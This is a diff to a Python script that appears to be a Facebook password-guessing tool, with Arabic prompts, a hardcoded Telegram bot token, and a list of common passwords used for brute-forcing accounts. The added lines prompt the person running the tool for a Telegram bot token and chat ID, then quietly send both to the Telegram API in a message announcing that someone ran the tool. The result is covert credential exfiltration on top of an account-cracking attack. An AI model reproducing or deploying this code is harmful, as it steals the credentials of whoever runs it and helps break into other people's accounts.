@@ -38,12 +38,18 @@ G = '\033[1;32m'
 S = '\033[1;33m'
 print('\x1b[38;5;205m لاتنسى صور صيد  تـم تشغيل  ')
 print('\n')
-
-token=input('\033[1;31mT\033[1;32mO\033[1;33mK\033[1;34mE\033[1;36mN\033[1;35m :\033[1;32m ')
-print('\n')
-ID=input('\033[1;31mI\033[1;34mD \033[1;32m   : ')
+token=input(f'{B} TOKEN {F} • {Y} تــوڪـن{R}→  ' +F) 
+print('')
+print('')
+ID=input(f'  {F}I{F}D{B}  • {B}ايــدي {F}→  \033[2;36m ')
+AVIP=f'\n - 🫶 قام شخص بتشغيل اداتك \n✵┈─┈─┈──𓆩@𓆪─┈─┈─┈─✵\n𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃  ➩ \nتم تشغيل الاداة \n ID  »»  {ID} \n -\ntoken  »»  {token} \n ✵┈─┈─┈──𓆩@𓆪─┈─┈─┈─✵ '
+requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(AVIP))
 os.system('clear')
-cetak(nel('\t• Sedang Menginstall Modul Requests •'))
+A = f'''tg://openmessage?user_id={ID}'''
+
+os.system('clear')
+pretty.install()
+CON = sol()
 print(f''''\x1b[38;5;228m
 ⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⡀⠀⢀⡴⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⢀⣠⠞⠁
 ⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿⢟⣻⣾⣿⠁⠀⠀⠀⠀⢀⣀⣤⣤⣶⣾⣿⣿⠁⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⣫⣷⣿⠏⠀⠀
@@ -90,6 +96,7 @@ print(f"""\033[32m
 ——————————————
  جــــاري الــــتــــحـــمــيـل     
  """)
+ 
 print('\n')
 token=('7097361149:AAEFcWGKkSv1yo35qXReclTUsJ7VUd8vNJ8')
 print('\n')
@@ -584,7 +591,7 @@ def setting():
 	else:
 		print('>> PILIH YANG BENAR BANG ')
 		exit()
-	print('>> 1. Mobile ')
+	print('>> 1. جوال ')
 #    print('>> 2. Mbasic ')
 #    print('>> 3. Touch  ')
 #    print('>> 4. Mtouch ')
@@ -713,17 +720,7 @@ def passwrd():
 					pwv.append('12345qwert')
 					pwv.append('qqwweerrtt')
 					pwv.append('zzxxccvv')
-					pwv.append('zxcvzxcv') 
-					pwv.append('19901990')
-					pwv.append('19911991')
-					pwv.append('19921992')
-					pwv.append('19931993')
-					pwv.append('19941994')
-					pwv.append('19951995')
-					pwv.append('19961996')
-					pwv.append('19971997')
-					pwv.append('19981998')
-					pwv.append('19991999')
+					pwv.append('zxcvzxcv')
 					pwv.append('20012001')
 					pwv. append('11223344@@')
 					pwv.append('20002000')
